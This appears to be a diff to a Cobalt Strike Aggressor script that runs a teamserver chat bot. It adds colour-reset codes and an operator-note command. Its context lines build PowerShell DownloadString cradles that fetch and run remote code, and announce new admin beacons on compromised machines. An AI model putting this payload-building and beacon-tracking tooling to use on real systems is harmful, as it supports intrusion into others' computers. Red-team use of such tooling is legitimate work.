@@ -51,7 +51,7 @@ sub getDownloadString {
             $downloadString .= $url . "'))\"";
 
             # println("Returning DownloadString: $downloadString");
-            say("Found Powershell DownloadString payload: \c9$downloadString\c0");
+            say("Found Powershell DownloadString payload: \c9$downloadString\o");
             return true;
         }
     }
@@ -83,7 +83,7 @@ sub createDownloadString {
         $downloadString .= $url . "'))\"";
 
         # println("Returning DownloadString $downloadString");
-        say("Here's your DownloadString: \c9$downloadString\c0");
+        say("Here's your DownloadString: \c9$downloadString\o");
     }
 }
 
@@ -143,7 +143,7 @@ sub notifyBeacon {
 # Triggered whenever user joins the teamserver
 on event_join {
     # Welcome them!
-    elog("User \c9$1\c7 joined! Welcome to the teamserver.");
+    elog("User \c9$1\c7 joined! Welcome to the teamserver.\o");
 }
 
 # Triggered on all public events in the event log
@@ -243,6 +243,18 @@ on event_public {
                 }
             }
         }
+        else if ($cmd eq "!r") {
+            local ('$msg');
+            if (!@args) {
+                say("Enter a note!");
+            }
+            else {
+                foreach $s (@args){
+                    $msg = $msg . " " . $s;
+                }
+                elog("Operator note: $msg");
+            }
+        }
         # Get help.
         else if ($cmd eq "!help") {
             say("Beep boop! Here are my commands:");
@@ -266,7 +278,7 @@ on beacon_initial {
     if (-isadmin $1) {
         # $1 for beacon_initial event is beacon ID, have to get metadata with bdata($1)
         $b = bdata($1);
-        say("\c5New admin beacon: \c2" . $b['user'] . "@" . $b['computer'] . "\c5!");
+        say("\c5New admin beacon: \c2" . $b['user'] . "@" . $b['computer'] . "\c5!\o");
     }
 
     # Get Windows version and set Beacon note
